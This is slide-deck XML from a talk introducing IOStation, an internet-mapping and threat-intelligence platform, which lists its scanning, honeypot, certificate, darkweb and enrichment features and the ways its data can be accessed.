            <a:pPr marL="758825" lvl="1" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>And now we’re back. Full on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>devving</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> on it, we have a designer and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>e’erything</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> and we have a ton of tools released that we’re going to show you</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-101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endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-101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endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-101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231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Meanwhile in a basement far far away…</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/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4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="879000" y="1825625"/>
            <a:ext cx="712513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2000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>IOStation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (the artist formerly known as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Omnisense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>) is a large collection of systems aimed at measuring the topography of the internet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2000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Sysadmins have never liked us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2000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>It started by learning how complicated and exploitable the DNS system is. That lead to writing a sinkhole, then a scanner to find all recursive servers on the internet, and then, and then … 6 years later.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2000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Major components include: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600"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Mass port scanning</a:t>
            </a:r>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" algn="l" rtl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600"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Globally distributed listening network of passive sensors</a:t>
            </a:r>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" algn="l" rtl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600"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>SSL certificate monitoring</a:t>
            </a:r>
            <a:endParaRPr sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" algn="l" rtl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600"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Darkweb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> monitoring</a:t>
            </a:r>
            <a:endParaRPr sz="2400"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2000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>The goal was to be 1-stop shopping for all information you could ever need on a given domain or IP address</a:t>
            </a:r>
            <a:endParaRPr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82FAB52-2E2B-A44B-9317-B509AAD3AFB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8263759" y="2070538"/>
            <a:ext cx="3090041" cy="30900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Satellite with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E361CC30-31DA-EE40-8954-4ADD75576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655485" y="2434578"/>
            <a:ext cx="2375417" cy="23754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 idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="879000" y="980675"/>
            <a:ext cx="10273800" cy="49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accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What’s in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IOStation</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="74" name="Google Shape;74;p12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="961992" y="811236"/>
            <a:ext cx="541200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FFB5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5" name="Google Shape;75;p12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="961992" y="1642414"/>
            <a:ext cx="3434644" cy="4645652"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F0F0F0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76" name="Google Shape;76;p12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663677" y="1638759"/>
            <a:ext cx="3434644" cy="4645652"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F0F0F0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/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Google Shape;77;p12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8391954" y="1642414"/>
            <a:ext cx="3434644" cy="4645652"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F0F0F0"/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/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="Google Shape;79;p12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663678" y="2378903"/>
            <a:ext cx="3434644" cy="26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45700" rIns="228600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2200" b="1" dirty="0">
                <a:latin typeface="Rubik"/>
                <a:ea typeface="Rubik"/>
                <a:cs typeface="Rubik"/>
                <a:sym typeface="Rubik"/>
              </a:rPr>
              <a:t>Passive</a:t>
            </a:r>
            <a:endParaRPr sz="2200" b="1" dirty="0">
              <a:latin typeface="Rubik"/>
              <a:ea typeface="Rubik"/>
              <a:cs typeface="Rubik"/>
              <a:sym typeface="Rubik"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-CA" b="1" dirty="0">
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>Certificate transparency log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Store and make searchable SSL certificates in near real-time.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef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n-CA" b="1" dirty="0">
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>Listening network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325"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Low interaction honeypots</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325"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Early identification of global threats</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325"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Threat profiling of logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325"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Risk metrics, breach history</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef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n-CA" b="1" dirty="0">
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>DNS amplification attack sinkhole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i="0" u="none" strike="noStrike" cap="none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961991" y="2352741"/>
            <a:ext cx="3373882" cy="26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45700" rIns="228600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2200" b="1" dirty="0">
                <a:latin typeface="Rubik"/>
                <a:ea typeface="Rubik"/>
                <a:cs typeface="Rubik"/>
                <a:sym typeface="Rubik"/>
              </a:rPr>
              <a:t>Active</a:t>
            </a:r>
            <a:endParaRPr sz="2200" b="1" dirty="0">
              <a:latin typeface="Rubik"/>
              <a:ea typeface="Rubik"/>
              <a:cs typeface="Rubik"/>
              <a:sym typeface="Rubik"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="3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b="1" dirty="0">
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>Port scanning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Ongoing asynchronous scanning with targeted scans prompted by other systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="4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b="1" dirty="0" err="1">
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>Darkweb</a:t>
            </a:r>
            <a:endParaRPr lang="en-CA" b="1" dirty="0">
              <a:latin typeface="Inter"/>
              <a:ea typeface="Inter"/>
              <a:cs typeface="Inter"/>
              <a:sym typeface="Inter"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-1873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Port scanning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-1873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Onion discovery and mapping</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-1873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Identity monitoring, mentions, topical anomaly detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-1873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Surface web correlation and attribution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="4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b="1" dirty="0">
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>Corporate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-1873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Public asset identification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-1873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Proxy metrics (job posting)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-1873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Risk metrics</a:t>
            </a:r>
            <a:endParaRPr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8469153" y="2378903"/>
            <a:ext cx="3255209" cy="29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45700" rIns="228600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2200" b="1" dirty="0">
                <a:latin typeface="Rubik"/>
                <a:ea typeface="Rubik"/>
                <a:cs typeface="Rubik"/>
                <a:sym typeface="Rubik"/>
              </a:rPr>
              <a:t>Enrichment</a:t>
            </a:r>
            <a:endParaRPr sz="2200" b="1" dirty="0">
              <a:latin typeface="Rubik"/>
              <a:ea typeface="Rubik"/>
              <a:cs typeface="Rubik"/>
              <a:sym typeface="Rubik"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef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n-CA" b="1" dirty="0">
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>WHOIS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325"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IP ASN/Org/POC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325"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Domain (low value)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef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n-CA" b="1" dirty="0">
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>Malware analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325"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Malware fingerprint, </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325"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Callout domains</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325"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Network behaviour</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-CA" b="1" dirty="0">
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>DNS root zone TLD</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325"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Daily zone files of ~900 TLDs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-187325">
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-CA" dirty="0">
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>Identify suspicious domains for malware or phishing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="11113" lvl="0"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CA" b="1" dirty="0" err="1">
                <a:latin typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>GeoIP</a:t>
            </a:r>
            <a:endParaRPr lang="en-CA" b="1" dirty="0">
              <a:latin typeface="Inter"/>
              <a:sym typeface="Inter"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Graphic 2" descr="Run with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A741F9AA-B8A5-A84B-A2C1-7D26463B77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8397" y="1709216"/>
            <a:ext cx="705314" cy="705314"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Graphic 6" descr="Open envelope with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{47E3D48E-22F1-5B43-9228-9622E3EA19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44100" y="1709216"/>
            <a:ext cx="705314" cy="705314"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Graphic 8" descr="Fishing with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{726FD82E-41AD-5148-AD18-A5C2F1D297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3021" y="1709216"/>
            <a:ext cx="723456" cy="7234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-192066" y="4183693"/>
            <a:ext cx="12576131" cy="2706108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0"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="388311" y="5093944"/>
            <a:ext cx="358244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3600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Started off small</a:t>
            </a:r>
            <a:endParaRPr sz="360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8771839-20CE-1B4C-B716-00F9DAD5F8EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3970751" y="4540928"/>
            <a:ext cx="0" cy="189143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oogle Shape;167;p8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D34D14C-5DFE-A046-A184-5E73C97D881D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4355214" y="4663683"/>
            <a:ext cx="7104188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90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="bg1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Wingdings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Hosting companies didn’t like me on their infrastructure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SzPts val="1800"/>
              <a:buFont typeface="Wingdings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I became an ISP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SzPts val="1800"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Linode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is pretty awesome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" name="Google Shape;162;p8" descr="A picture containing indoor, wall, floor, furniture&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA9DA787-A1E7-2B47-8E4A-88F717DF48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478" r="-3" b="7125"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8260082" y="0"/>
            <a:ext cx="3931900" cy="4005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3;p8" descr="A picture containing indoor, wall, ceiling, floor&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91FFE1B1-3707-AF42-9BC9-320EBC7787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26369" b="-2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="3931920" cy="4005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64;p8" descr="A picture containing indoor, wall, floor, office&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C243502F-9AC1-3D4D-9876-3C5F475F54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1756" r="-3" b="1845"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4120896" y="0"/>
            <a:ext cx="3931920" cy="4005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181409-BAAA-354E-9C99-A2B36FBBE609}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5448822" y="2367171"/>
            <a:ext cx="534861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Stop: It’s demo time.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Graphic 4" descr="Hammer with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D83EF1B6-5449-7343-9974-1B03476CE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727" y="2749462"/>
            <a:ext cx="1165965" cy="1165965"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Graphic 6" descr="Clock with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0754020D-F034-AB45-94FE-22241E5EAB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54056" y="2749462"/>
            <a:ext cx="1165965" cy="116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247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How’s it being used</a:t>
            </a:r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body" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="879000" y="1825625"/>
            <a:ext cx="9636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There’s a few ways you can use this:</a:t>
            </a:r>
            <a:endParaRPr sz="2000"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There’s a free and open REST API</a:t>
            </a:r>
            <a:endParaRPr sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="120015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itchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Can search by vuln, domain name, wildcards are allowed</a:t>
            </a:r>
            <a:endParaRPr sz="2000"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There’s a CLI tool</a:t>
            </a:r>
            <a:endParaRPr sz="2000"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Soon to come</a:t>
            </a:r>
            <a:endParaRPr sz="2000"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A search engine interface (already in alpha)</a:t>
            </a:r>
            <a:endParaRPr sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2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itchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Can search by vuln, domain name, wildcards are allowed</a:t>
            </a:r>
            <a:endParaRPr sz="2000"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A recon-ng module</a:t>
            </a:r>
            <a:endParaRPr sz="2000"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A h8mail module</a:t>
            </a:r>
            <a:endParaRPr sz="2000"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A Metasploit module</a:t>
            </a:r>
            <a:endParaRPr sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1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Anything else YOU feel like writing or want us to write – just shoot us ideas!</a:t>
            </a:r>
            <a:endParaRPr sz="2000"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How u do dis?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A5EBE1-F5F7-C146-B4D0-D71E8A52141B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="977030" y="1678488"/>
            <a:ext cx="9807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Three answers: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5F6FB0-3EC9-6048-9BE4-F3537FA5A834}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1064712" y="2617940"/>
            <a:ext cx="2655518" cy="2442575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E44556-F0BB-AA48-BAC5-6D3632B58C0C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4768241" y="2617939"/>
            <a:ext cx="2655518" cy="2442575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BD38B5-0DC9-1A4B-A6F9-8B09F7AD450D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8471770" y="2617939"/>
            <a:ext cx="2655518" cy="2442575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258E2-7ABE-8341-A28A-F31C14EC0D82}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1164921" y="3666994"/>
            <a:ext cx="2442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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>fuckton</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> of work and benchmarking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F93525-C6F4-B240-8197-41940BBA234B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4885151" y="3688915"/>
            <a:ext cx="2430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“Creative” engineering (aka repurposing tech)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6C38FE-7F79-4543-A454-0D2901B68B34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8580328" y="3666994"/>
            <a:ext cx="24467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Embrace the cloud (ride the snake)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Graphic 7" descr="Body builder with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0CBDD2E9-DD1D-7C4E-8AD9-5DAEB3F6E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1137" y="2811907"/>
            <a:ext cx="682668" cy="682668"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Graphic 11" descr="Recycle with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7DF2CD45-D129-BD45-A47A-7BA7A77CE9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54666" y="2811907"/>
            <a:ext cx="682668" cy="682668"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Graphic 13" descr="Snake with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E2276962-ED86-3943-ACC3-2FA288843E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58195" y="2811907"/>
            <a:ext cx="682668" cy="6826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AC718-0D02-5B42-9218-851218DFE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the metrics?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Google Shape;191;p13" descr="A screenshot of a video game&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
